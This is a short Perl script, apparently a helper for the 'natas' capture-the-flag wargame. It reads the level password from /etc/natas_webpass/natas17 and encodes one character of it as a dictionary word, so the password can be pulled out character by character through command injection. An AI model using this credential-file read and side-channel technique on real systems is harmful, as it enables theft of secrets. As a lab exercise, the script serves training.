# character to extract
#$i=$ENV{'haxGetchar'};
$i=$ARGV[0];
# read file to $string
#open FILE, "natas17" or print "Nazi's" and exit; 
open FILE, "/etc/natas_webpass/natas17" or print "Nazi's" and exit; 
while (<FILE>){
 $password=$_;
}
close FILE;

# get ascii code of target char
$targ = ord(substr($password,$i,1));

@known=("African","Africans","Allah","Allah's","American","Americanism","Americanism's","Americanisms","Americans","April","April's","Aprils","Asian","Asians","August","August's","Augusts","B","B's","British","Britisher","Brown","Brown's","C","C's","Catholic","Catholicism","Catholicism's","Catholicisms","Catholics","Celsius","Celsiuses","Chicano","Chicano's","Chicanos","Christian","Christian's","Christianities","Christianity","Christianity's","Christians","Christmas","Christmas's","Christmases","Congress","Congress's","Cs","D","D's","December","December's","Decembers","Doctor","Dutch","Dutch's","E","E's","Easter","Easter's","Easters","England","England's","English","English's","Englished","Englisher","Englishes","Englishing","Es","Eskimo","Eskimo's","Eskimos","Europe","Europe's","European","Europeans","F","F's","Fahrenheit","Fahrenheits","Februaries","February","February's","Februarys","French","French's","Friday","Friday's","Fridays","G","G's","God","God's","Greek","Greek's","Greeks","H","H's","Halloween","Halloween's","Halloweens","Hebrew","Hebrew's","Hebrews","Hispanic","Hispanics","I","I'm","Indian","Indian's","Indians","Islam","Islam's","Islamic","Islamics","Islams","Januaries","January","January's","Januarys","Jew","Jew's","Jewish","Jews","John","John's","Judaism","Judaism's","Judaisms","Julies","July","July's","June","June's","Junes","K","K's","Koran","Koran's","Korans","Latin","Latin's","Latiner","Latins","March","March's","Marches","Marxism","Marxism's","Marxisms","Marxist","Marxist's","Marxists","May","May's","Mays","Mister","Mister's","Monday","Monday's","Mondays","Moslem","Moslem's","Moslems","Mr","Mr's","Mrs","Ms","Muslim","Muslim's","Muslims","N","N's","Nazi","Nazi's","Nazis","Negro","Negro's","Negroes","November","November's","Novembers","O","OK","OKs","October","October's","Octobers","Os","P","P's","Passover","Passover's","Passovers","Protestant","Protestant's","Protestants","S","S's","Sabbath","Sabbath's","Sabbaths","Satan","Satan's","Saturday","Saturday's","Saturdays","Scotch","Scotches","September","September's","Septembers","Sunday","Sunday's","Sundays","T","T's","Taurus","Taurus's","Tauruses","Thursday","Thursday's","Thursdays","Tuesday","Tuesday's","Tuesdays","U","V","V's","W","W's","Wednesday","Wednesday's","Wednesdays","Xmas","Xmas's","Xmases","Y","Y's","Yankee","Yankee's","Yankees","Yiddish","Yiddish's","a","aardvark","aardvark's","abaci","aback","abacus","abacus's","abacuses","abandon","abandoned","abandoning","abandonment","abandonment's","abandons","abate","abated","abates","abating","abbey","abbey's","abbeys","abbot");

print $known[$targ];
